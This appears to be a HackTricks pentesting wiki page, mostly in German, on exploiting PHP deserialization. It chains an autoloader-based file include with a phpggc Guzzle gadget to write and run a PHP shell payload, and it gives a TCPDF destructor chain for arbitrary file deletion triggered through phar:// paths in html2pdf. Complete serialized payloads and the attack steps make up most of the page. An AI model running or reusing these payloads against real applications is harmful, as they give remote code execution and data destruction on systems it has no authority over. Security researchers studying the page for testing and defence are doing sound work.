# PHP - Deserialization + Autoload Classes

{{#include ../../banners/hacktricks-training.md}}

Zuerst solltest du nachschauen, was [**Autoloading Classes**](https://www.php.net/manual/en/language.oop5.autoload.php) sind.

## PHP deserialization + spl_autoload_register + LFI/Gadget

Wir befinden uns in einer Situation, in der wir eine **PHP deserialization in einer webapp** gefunden haben und es **keine** Library gibt, die innerhalb von **`phpggc`** für gadgets verwundbar ist. Im selben Container befand sich jedoch eine **andere composer webapp mit verwundbaren libraries**. Daher war das Ziel, den **composer loader der anderen webapp** zu laden und diesen auszunutzen, um ein **gadget** zu laden, das diese Library mit einem gadget aus der an Deserialisierung verwundbaren webapp ausnutzt.

Steps:

- Du hast eine **deserialization** gefunden und es gibt **kein gadget** im aktuellen App-Code
- Du kannst eine **`spl_autoload_register`**-Funktion wie die folgende missbrauchen, um **jede lokale Datei mit `.php` extension** zu laden
- Dafür verwendest du eine deserialization, bei der der Klassenname in **`$name`** steht. Du **kannst weder "/" noch "."** in einem Klassennamen in einem serialisierten Objekt verwenden, aber der **code** **ersetzt** die **underscores** ("\_") **durch slashes** ("/"). Ein Klassenname wie `tmp_passwd` wird also in `/tmp/passwd.php` umgewandelt und der Code wird versuchen, diese zu laden.\
Ein **gadget example** wird sein: **`O:10:"tmp_passwd":0:{}`**
```php
spl_autoload_register(function ($name) {

if (preg_match('/Controller$/', $name)) {
$name = "controllers/${name}";
} elseif (preg_match('/Model$/', $name)) {
$name = "models/${name}";
} elseif (preg_match('/_/', $name)) {
$name = preg_replace('/_/', '/', $name);
}

$filename = "/${name}.php";

if (file_exists($filename)) {
require $filename;
}
elseif (file_exists(__DIR__ . $filename)) {
require __DIR__ . $filename;
}
});
```
> [!TIP]
> Wenn du eine **file upload** hast und eine Datei mit **`.php` extension** hochladen kannst, könntest du diese Funktionalität direkt ausnutzen und bereits RCE erhalten.

In meinem Fall hatte ich so etwas nicht, aber im **same container** befand sich eine weitere composer web page mit einer **library vulnerable to a `phpggc` gadget**.

- To load this other library, first you need to **load the composer loader of that other web app** (because the one of the current application won’t access the libraries of the other one.) **Knowing the path of the application**, you can achieve this very easily with: **`O:28:"www_frontend_vendor_autoload":0:{}`** (In my case, the composer loader was in `/www/frontend/vendor/autoload.php`)
- Now, you can **load** the others **app composer loader**, so it’s time to **`generate the phpgcc`** **payload** to use. In my case, I used **`Guzzle/FW1`**, which allowed me to **write any file inside the filesystem**.
- HINWEIS: Das **generated gadget was not working** — damit es funktionierte, habe ich das **modified** payload **`chain.php`** von phpggc angepasst und alle **attribute** der Klassen **from private to public** gesetzt. Wenn nicht, hatten die Attribute der erzeugten Objekte nach Deserialisierung keine Werte.
- Now we have the way to **load the others app composer loader** and have a **phpggc payload that works**, but we need to **do this in the SAME REQUEST for the loader to be loaded when the gadget is used**. For that, I sent a serialized array with both objects like:
- You can see **first the loader being loaded and then the payload**
```php
a:2:{s:5:"Extra";O:28:"www_frontend_vendor_autoload":0:{}s:6:"Extra2";O:31:"GuzzleHttp\Cookie\FileCookieJar":4:{s:7:"cookies";a:1:{i:0;O:27:"GuzzleHttp\Cookie\SetCookie":1:{s:4:"data";a:3:{s:7:"Expires";i:1;s:7:"Discard";b:0;s:5:"Value";s:56:"<?php system('echo L3JlYWRmbGFn | base64 -d | bash'); ?>";}}}s:10:"strictMode";N;s:8:"filename";s:10:"/tmp/a.php";s:19:"storeSessionCookies";b:1;}}
```
- Jetzt können wir **eine Datei erstellen und schreiben**, allerdings konnte der Benutzer **in keinem Ordner innerhalb des Webservers schreiben**. Wie in der Payload zu sehen ist, wird eine PHP-Datei erstellt, die **`system`** mit etwas **base64** aufruft und in **`/tmp/a.php`** gespeichert wird. Dann können wir **die erste Art von Payload wiederverwenden**, die wir als LFI verwendet haben, um den composer loader der anderen Webapp zu nutzen, um die erzeugte **`/tmp/a.php`** Datei zu laden. Füge es einfach dem deserialization gadget hinzu:
```php
a:3:{s:5:"Extra";O:28:"www_frontend_vendor_autoload":0:{}s:6:"Extra2";O:31:"GuzzleHttp\Cookie\FileCookieJar":4:{s:7:"cookies";a:1:{i:0;O:27:"GuzzleHttp\Cookie\SetCookie":1:{s:4:"data";a:3:{s:7:"Expires";i:1;s:7:"Discard";b:0;s:5:"Value";s:56:"<?php system('echo L3JlYWRmbGFn | base64 -d | bash'); ?>";}}}s:10:"strictMode";N;s:8:"filename";s:10:"/tmp/a.php";s:19:"storeSessionCookies";b:1;}s:6:"Extra3";O:5:"tmp_a":0:{}}
```
**Zusammenfassung des payload**

- **Load the composer autoload** einer anderen webapp im selben Container
- **Load a phpggc gadget** um eine Library der anderen webapp zu missbrauchen (die initiale webapp, die für deserialization verwundbar war, hatte in ihren Libraries kein Gadget)
- Das gadget wird **create a file with a PHP payload** in /tmp/a.php ablegen mit bösartigen Befehlen (der webapp user kann in keinem Ordner einer webapp schreiben)
- Der letzte Teil unseres payload wird **load the generated php file** verwenden, das Befehle ausführt

Ich musste **call this deserialization twice**. In meinen Tests wurde die Datei `/tmp/a.php` beim ersten Mal erstellt, aber nicht geladen, und beim zweiten Mal korrekt geladen.

## TCPDF `__destruct` POP chain for arbitrary file deletion

When a real `TCPDF` instance is garbage-collected it calls `_destroy(true)`, iterates over `$this->imagekeys`, and `unlink()`s anything that looks like a cache file under `K_PATH_CACHE`. If an application performs `unserialize($user_data)` while the `TCPDF` class is loaded (e.g. it expects an array with an `html` key), you can supply a serialized object that sets:

- `file_id` to any integer that is not present in `self::$cleaned_ids` (e.g. `-1`).
- `imagekeys` to paths that begin with `K_PATH_CACHE` or that can be made to look like it (e.g. `/tmp/../tmp/do_not_delete_this_file.txt` when `K_PATH_CACHE` is `/tmp/`).

Example payload hitting an unsafe `unserialize($_GET['p']); $pdf->writeHTML($payload['html']);` flow:
```text
a:1:{s:4:"html";O:5:"TCPDF":2:{s:7:"file_id";i:-1;s:9:"imagekeys";a:1:{i:0;s:39:"/tmp/../tmp/do_not_delete_this_file.txt";}}}
```
Die Datei wird gelöscht, sobald das Objekt außer Scope fällt. TCPDF 6.9.3 verschärfte die Prüfung, sodass nur noch Pfade mit dem Präfix `__tcpdf_<file_id>_` innerhalb von `K_PATH_CACHE` entfernt werden, und führte `_unlink()` ein, um nicht-`file://`-Schemen zu blockieren — ältere `Producer`-Versionen sind daher ideale Ziele.

### Auslösen des Gadgets via `phar://` in html2pdf `<cert>` tags

`spipu/html2pdf` (≤5.3.0) kapselt TCPDF und stellt einen benutzerdefinierten `<cert>`-Block bereit, dessen `src`/`privkey`-Attribute mit einfachem `file_exists()` validiert werden. Auf PHP < 8.0 führt jede Dateisystemfunktion, die eine `phar://`-URL berührt, dazu, dass die Phar-Metadaten unserialisiert werden. Wenn man das oben beschriebene bösartige TCPDF-Objekt in den Phar-Metadaten ablegt, erhält man einen zuverlässigen POP, selbst wenn die Anwendung niemals selbst `unserialize()` aufruft.

1. Erzeuge eine Phar mit `phar.readonly=0`, setze den Stub/Manifest so, dass es wie ein Bild aussieht (z. B. `archive.phar` in `archive.png` umbenennen), und speichere das serialisierte TCPDF-Objekt in den Phar-Metadaten.
2. Lade die Datei hoch/platziere sie irgendwo erreichbar, z. B. unter `/tmp/user_files/user_1/archive.png`.
3. Sende HTML, das den CERT-Tag enthält, sodass html2pdf den vom Angreifer kontrollierten Pfad auflöst:
```html
<cert src="phar:///tmp/user_files/user_1/archive.png"
privkey="phar:///tmp/user_files/user_1/archive.png" />
```
Der Aufruf von `file_exists()` deserialisiert die Metadaten, instanziiert TCPDF, und dessen Destruktor löscht die ausgewählte Datei, wodurch html2pdf zu einem mächtigen `phar://` entry point wird. Version 5.3.1 fügte `Security::checkValidPath()` hinzu, um nicht genehmigte Schemes zu blockieren, sodass Legacy-Deployments weiterhin attraktiv bleiben.

## Referenzen

- [Positive Technologies – Blind Trust: What Is Hidden Behind the Process of Creating Your PDF File?](https://swarm.ptsecurity.com/blind-trust-what-is-hidden-behind-the-process-of-creating-your-pdf-file/)

{{#include ../../banners/hacktricks-training.md}}
